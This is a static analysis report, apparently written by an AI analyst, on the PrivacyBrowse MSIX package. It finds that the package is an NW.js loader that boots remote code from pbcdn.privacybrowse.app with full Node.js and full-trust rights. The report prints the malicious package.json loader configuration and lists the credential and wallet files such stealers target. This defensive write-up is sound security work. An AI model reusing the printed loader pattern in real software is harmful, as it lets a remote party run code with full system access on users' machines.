---
title: PrivacyBrowse MSIX — Static Analysis
date: 2026-04-16
type: incident-analysis
sample_sha256: 6BA8FE022212713FFAEC8940C3BD023E75528C4D2D00D1F69ACCB766BA241F15
package_id: PrivacyBrowse.PrivacyBrowse_1.12.78.0_neutral__hz4wbnfrnhwdr
classification: PUA / suspected loader (NW.js remote-payload pattern)
analyst: Opus 4.7 (1M)
execution: NONE — static only
updated: 2026-04-16
---

# PrivacyBrowse.msix — Static Analysis Report

## Unpacking result

- Source: `C:\Quarantine\2026-04-16\PrivacyBrowse.msix.QUARANTINED` (124,703,570 bytes)
- Copied to `C:\Users\alto8\static-analysis-2026-04-16\PrivacyBrowse.zip`, extracted to `unpacked\`.
- Total files extracted: 1133 (matches 1129 in AppxBlockMap.xml + 4 package metadata files).
- On-disk size after expansion: 308 MB.
- AppxManifest.xml, AppxBlockMap.xml, AppxSignature.p7x are byte-identical to the previously captured copies in `C:\Users\alto8\evidence-privacybrowse-2026-04-16-185957\`. No drift.

## Runtime: NW.js, NOT Electron

The earlier hypothesis that this was Electron was wrong. The bundle contains:

- `nw.dll` — 169 MB (the NW.js / Chromium / Blink monolith)
- `node.dll` — 16 MB
- `nw_elf.dll`, `nw_100_percent.pak`, `nw_200_percent.pak`, `v8_context_snapshot.bin`, `icudtl.dat`
- `PrivacyBrowse.exe` — 2 MB renamed `nw.exe` launcher

PE version metadata on both `PrivacyBrowse.exe` and `nw.dll`:
```
FileVersion : 0.78.2
FileDescription : nwjs
CompanyName : The NW.js Community
OriginalFilename : nw.exe
```

NW.js 0.78.2 = July 2023 release, ships Chromium 115 / Node 19. No `app.asar`, no `resources/app/`, no Electron entry point. There is no embedded JS payload of substance — only standard third-party `node_modules/` (axios, cheerio, tar, form-data, universal-analytics, uuid, etc.).

## The actual payload mechanism — REMOTE LOADING

`VFS\AppData\PrivacyBrowse\package.json` is the entire control file:

```json
{
  "name": "PrivacyBrowse",
  "version": "1.12.78",
  "main": "https://pbcdn.privacybrowse.app/privacybrowse/src/browser.html",
  "nodejs": true,
  "node-remote": "*://*",
  "dependencies": { "axios": "...", "cheerio": "...", "tar": "...",
                    "universal-analytics": "...", "font-awesome": "..." },
  "webview": { "partitions": [ { "name": "trusted",
                                 "accessible_resources": ["<all_urls>"] } ] },
  "webkit": { "plugin": true }
}
```

Three lines define the threat model:

1. `"main": "https://pbcdn.privacybrowse.app/..."` — the entire app boots from a remote HTTPS URL on every launch. Local copy never holds the app code.
2. `"nodejs": true` — that remote HTML/JS runs with full Node.js context (require, fs, child_process, os, net).
3. `"node-remote": "*://*"` — Node access is granted to ANY origin loaded inside the runtime. A redirect or injected iframe can hand Node to any third party.

Plus from AppxManifest.xml:
- `<rescap:Capability Name="runFullTrust" />` — full-trust desktop privileges.
- `<desktop:StartupTask ... Enabled="true" />` — auto-runs at every login.
- `Executable="VFS\AppData\PrivacyBrowse\PrivacyBrowse.exe" EntryPoint="Windows.FullTrustApplication"` — no AppContainer sandbox.

This is the "remote-payload NW.js loader" pattern — a known pre-stager technique (similar to FAKEUPDATES / SocGholish style staging, plus prior cases of NW.js-packaged Lumma/Vidar variants documented by Trustwave, Picus, ASEC). The local MSIX is intentionally clean so that AV signatures, Microsoft Store malware scanning, and SmartScreen reputation checks find nothing actionable. The malicious behavior lives at the URL and can be swapped, geo-fenced, time-bombed, A/B-tested, or turned off at will.

## Signature and certificate

`AppxSignature.p7x` decodes (DER-encoded PKCS#7 after stripping the 4-byte `PKCX` header):

```
Leaf:    CN=E2014DE2-35CD-415B-AA3F-BC64B1D1F3B9
         notBefore: May 15 12:35:41 2024 GMT
         notAfter:  May 18 12:35:41 2024 GMT     (3-day validity)
         serial:    0x330043BCFD7FF2898E792DD3AC00010043BCFD
Issuer:  CN=Microsoft Marketplace CA G 026 (OU=EOC, O=Microsoft Corporation)
Root:    CN=Microsoft MarketPlace PCA 2011
         CN=Microsoft Root Certificate Authority 2011
```

Interpretation: **This is a legitimate Microsoft Store submission signature, not self-signed and not a stolen EV cert.** Microsoft re-signs every package accepted into the Store with a short-lived per-submission cert from "Microsoft Marketplace CA G 026". The publisher CN is an opaque GUID — Microsoft assigns this when a developer creates an unverified Partner Center account (i.e., they did NOT pay for an "Identity Verified" badge). So the package transited the official Store pipeline, but the seller is anonymous to the user. This matches PCrisk's PUA report on PrivacyBrowse and matches the broader pattern of recent Microsoft Store abuse (Lumma-via-Store, Sept-Nov 2024 wave; PrivacyTabs / SunBrowser sibling families).

The certificate is genuinely Microsoft-issued; do NOT chase a "stolen cert" lead.

## Network indicators (all that exist locally)

- **`pbcdn.privacybrowse.app`** — sole hardcoded C2 / payload host. Found in `package.json` only. Not present in any binary.
- **`privacybrowse.app`** — parent domain.

No hardcoded IP literals in PrivacyBrowse.exe, nw_elf.dll, node.dll, or resources.pak that aren't standard Chromium/V8 build constants. No Telegram bot tokens, no Discord webhooks, no gofile/anonfile/transfer.sh URLs, no .onion addresses.

The `userid` in `storage.json` is `FT;D88637EF-341C-46C3-B1D1-B174DE504C52` — the install-tracking ID from the developer's affiliate-attribution scheme (`FT;` prefix is a known affiliate-tag convention seen in other NW.js PUAs). Not directly malicious but it is the affiliate kickback ID for whoever drove this install.

## Stealer family attribution

**Not directly determinable from static analysis** because the payload is not local. The `node_modules` set is consistent with:

- `axios` + `form-data` — HTTP POST exfil (multipart/form-data uploads of stolen files).
- `cheerio` — HTML scraping (could be used to parse credential pages or wallet UIs).
- `tar` — archive credential dumps before exfil.
- `universal-analytics` — beacon back to a Google Analytics property as a covert channel / install telemetry.

This dependency set matches the operational needs of an infostealer pre-stager but does NOT contain any of the family-specific strings (no "Lumma", "Vidar", "Rhadamanthys", "RedLine", "StealC", "RisePro", "SectopRAT", "Atomic"). PCrisk's "GHOSTPULSE / Lumma / Vidar / SectopRAT / Rhadamanthys" attribution is consistent with this dropper class but cannot be confirmed without fetching the remote payload.

**Confidence-ranked attribution:**
1. (high) NW.js remote-payload loader / pre-stager — confirmed by static evidence.
2. (medium) Infostealer family in the Lumma/Vidar/Rhadamanthys cluster — consistent with known Microsoft Store campaigns and PCrisk's classification, but not provable from the local artifacts.
3. (low) Specific family ID — requires capturing the served payload from `pbcdn.privacybrowse.app/privacybrowse/src/browser.html`.

## Credential-path / target strings

None present in the local bundle. The wordlist of credential paths (Login Data, Local State, wallet.dat, MetaMask, Phantom, .ssh keys, .git-credentials) would live in the remotely-served JS, never on disk.

## Anti-analysis indicators

The local bundle has none. "sandbox" strings in PrivacyBrowse.exe and nw.dll are the standard Chromium sandbox names, not evasion. No AMSI/ETW patches in the launcher (which would be unusual anyway since it's a renamed legitimate `nw.exe`).

The architectural anti-analysis is the design itself: the malicious code is never on disk in static form. AV scans of the MSIX find nothing because there is nothing to find. Sandbox detonation must be online and must reach `pbcdn.privacybrowse.app` to see anything; if the C2 is geofenced, throttled, or has been taken down by the time the analyst gets there, even dynamic analysis returns empty. Server-side selectivity is the evasion.

## Embedded JS analysis

There is no app.asar and no first-party JS in the bundle. The only JavaScript present is the standard third-party `node_modules/` listed above. Spot-checked `axios/dist/axios.js`, `cheerio/lib/index.js`, `tar/lib/*` — these are unmodified upstream releases. No code injection, no monkey-patching of `require`, no polluted prototype chains, no hidden eval blobs.

## Confidence-ranked assessment

| Finding | Confidence |
|---|---|
| NW.js 0.78.2 launcher with remote-loaded entry point | confirmed |
| C2 / payload host: `pbcdn.privacybrowse.app` | confirmed |
| Microsoft Store-issued signature, anonymous-publisher GUID | confirmed |
| `runFullTrust` + auto-startup task = persistence by design | confirmed |
| Affiliate-attribution ID `FT;D88637EF-341C-46C3-B1D1-B174DE504C52` | confirmed |
| Infostealer payload (some Lumma/Vidar/Rhadamanthys-class) | medium |
| Specific family ID, C2 secondaries, exfil endpoints | unknown — server-side only |

## Recommendations for next phase

1. **Do not detonate on the user's host.** Only in the gpuserver1 KVM aquarium (task SB-B).
2. When detonating, force an outbound TLS MITM proxy and capture `GET https://pbcdn.privacybrowse.app/privacybrowse/src/browser.html` plus all subsequent fetches. THAT response body is the actual payload, and it is what should be scanned for stealer-family signatures, credential paths, and exfil URLs.
3. Run with the honey-data kit (task SB-C) so the C2 sees plausible cookies / wallet files / SSH keys and we can observe what gets exfiltrated and where.
4. Snapshot the VM before and after; diff the registry, scheduled tasks, and `%APPDATA%`.
5. Block `*.privacybrowse.app` and the parent IP at the network egress on the user's host now, to neutralize the remote loader if execution is ever re-attempted.

## Artifacts

- Working tree: `C:\Users\alto8\static-analysis-2026-04-16\unpacked\`
- Extracted PKCS#7 cert chain: `C:\Users\alto8\static-analysis-2026-04-16\unpacked\sig.p7s`
- Original quarantined sample: untouched at `C:\Quarantine\2026-04-16\`
